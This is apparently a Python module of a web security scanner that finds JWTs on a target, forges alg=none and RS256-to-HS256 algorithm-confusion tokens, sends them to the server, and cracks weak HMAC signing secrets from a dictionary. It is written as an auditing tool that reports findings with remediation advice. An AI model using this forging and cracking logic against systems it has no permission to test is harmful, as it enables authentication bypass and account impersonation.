"""VAJRA JWT security auditor — decodes tokens found on targets and runs
alg=none acceptance, weak-HMAC-secret and claims checks."""
import base64
import hashlib
import hmac
import json

from core.database import Finding

TOKEN_RE = None


def _b64d(seg):
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def decode_jwt(token):
    try:
        h, p, s = token.split(".")
        header = json.loads(_b64d(h))
        payload = json.loads(_b64d(p))
        sig = _b64d(s) if s else b""
        return {"header": header, "payload": payload, "sig": sig,
                "parts": (h, p, s)}
    except Exception:
        return None


def _alg_confusion(engine, base, info, summary):
    """Forged HS256 token signed with the RSA public key 'n' from JWKS. If the
    verifier trusts alg from the header AND uses the public key bytes as an
    HMAC secret (the classic asymmetric-to-symmetric confusion), the forged
    token is accepted where the genuine token is rejected by a fresh check."""
    try:
        keys = (engine.state.get("api") or {}).get("jwks") or []
        n = None
        for k in keys:
            if k.get("kty") == "RSA" and k.get("n"):
                n = k["n"]
                break
        if not n:
            return
        import base64 as _b64
        pad = "=" * (-len(n) % 4)
        pubbytes = _b64.urlsafe_b64decode(n + pad)
        hdr_b = _b64.urlsafe_b64encode(json.dumps(
            {"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        sig_in = (hdr_b + "." + info["parts"][1]).encode()
        sig = _b64.urlsafe_b64encode(
            hmac.new(pubbytes, sig_in, hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        forged = "%s.%s.%s" % (hdr_b, info["parts"][1], sig)
        r0 = engine.http.get(base, headers={"Authorization": "Bearer " + forged},
                             allow_redirects=False)
        rb = engine.http.get(base, allow_redirects=False)
        if 200 <= r0.status < 300 and not (200 <= rb.status < 300):
            engine.db.add_finding(Finding(
                engine.target.display, "web.jwt_audit", "verified-exposure",
                "critical", "[VERIFIED] RS256->HS256 algorithm confusion — "
                            "RSA public key used as HMAC secret",
                detail="Forged HS256 token (signed with JWKS 'n') accepted "
                       "where the unauthenticated baseline was rejected.\n"
                       + summary,
                evidence=forged[:200],
                remediation="Enforce an explicit allowed-algorithm list; "
                            "never use public key material as symmetric "
                            "secret.", confidence="firm"))
            engine.log.finding("[jwt] ALG-CONFUSION verified via JWKS n")
    except Exception:
        return


def find_tokens(engine):
    tokens = set()
    for page in engine.state.get("pages", []):
        for ck in page.get("headers", {}).get("set-cookie", "").split(","):
            pass
        body = page.get("body", "")
        import re
        for m in re.finditer(r"eyJ[A-Za-z0-9_-]{6,}\.[eyJ][A-Za-z0-9_-]{4,}"
                             r"\.[A-Za-z0-9_-]*", body):
            tokens.add(m.group(0))
    r = engine.http.get((engine.state.get("web_targets") or [{"url": ""}])[0]
                        ["url"].rstrip("/") + "/")
    auth = r.headers.get("authorization", "")
    if auth.startswith("Bearer "):
        tokens.add(auth[7:].strip())
    for cpart in r.cookies_str.split(";"):
        for piece in cpart.split(","):
            piece = piece.strip()
            if piece.startswith("eyJ") and "." in piece:
                tokens.add(piece)
    return [t for t in tokens if decode_jwt(t)]


def run(engine):
    t = engine.target
    targets = engine.state.get("web_targets") or []
    if not targets:
        return
    from core.payload_engine import JWT_WEAK_SECRETS
    base = targets[0]["url"].rstrip("/")
    tokens = find_tokens(engine)
    if not tokens:
        engine.db.add_event(t.display, "jwt.audit", "no tokens observed")
        return
    engine.db.add_finding(Finding(
        t.display, "web.jwt_audit", "recon", "info",
        "JWT tokens discovered: %d" % len(tokens),
        evidence="\n".join(tok[:90] + "…" for tok in tokens[:8]),
        confidence="firm"))
    for tok in tokens[:5]:
        info = decode_jwt(tok)
        hdr, pl = info["header"], info["payload"]
        alg = str(hdr.get("alg", "?")).lower()
        interesting = {k: v for k, v in pl.items()
                       if k.lower() in ("role", "admin", "user", "uid",
                                        "email", "scope", "privilege")}
        summary = "alg=%s claims=%s" % (
            alg, json.dumps(interesting)[:200] if interesting else "-")

        # ---- alg=none acceptance ----
        if alg != "none":
            none_tok = info["parts"][0] + "." + info["parts"][1] + "."
            r0 = engine.http.get(base, headers={"Authorization":
                                                "Bearer " + none_tok},
                                 allow_redirects=False)
            rb = engine.http.get(base, allow_redirects=False)
            if 200 <= r0.status < 300 and not (200 <= rb.status < 300):
                engine.db.add_finding(Finding(
                    t.display, "web.jwt_audit", "verified-exposure",
                    "critical", "[VERIFIED] JWT accepts alg=none — "
                                "authentication forgeable",
                    detail="Stripped-signature token accepted where the "
                           "original was rejected.", evidence=none_tok,
                    confidence="firm"))

        # ---- RS256 -> HS256 algorithm confusion (live) ----
        if str(hdr.get("alg", "")).upper() == "RS256":
            _alg_confusion(engine, base, info, summary)

        # ---- weak HMAC secret ----
        if alg in ("hs256", "hs384", "hs512"):
            sha = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
                   "hs512": hashlib.sha512}[alg]
            signing_input = (info["parts"][0] + "." + info["parts"][1]).encode()
            for secret in JWT_WEAK_SECRETS:
                if hmac.new(secret.encode(), signing_input,
                            sha).digest() == info["sig"]:
                    engine.db.add_finding(Finding(
                        t.display, "web.jwt_audit", "exploit-proof",
                        "critical",
                        "[VERIFIED] JWT signing key cracked: %r" % secret,
                        detail="Token forging is now trivial; full account "
                               "impersonation possible.\n" + summary,
                        evidence="hmac preimage matched with dictionary "
                                 "secret",
                        remediation="Rotate to a high-entropy asymmetric "
                                    "key (RS256/EdDSA).",
                        confidence="firm"))
                    break

        # ---- claim observations ----
        notes = []
        exp = pl.get("exp")
        if exp:
            import time as _t
            if float(exp) < _t.time():
                notes.append("token already EXPIRED yet still presented")
        if any(str(v).lower() in ("admin", "true", "root") for v in pl.values()):
            notes.append("privileged claims present (%s)" %
                         ",".join(k for k, v in pl.items()
                                  if str(v).lower() in ("admin", "true",
                                                        "root")))
        if alg == "none":
            notes.append("unsigned token in the wild")
        if notes:
            engine.db.add_finding(Finding(
                t.display, "web.jwt_audit", "hardening", "medium",
                "JWT weaknesses observed: " + "; ".join(notes),
                evidence=summary, confidence="firm"))
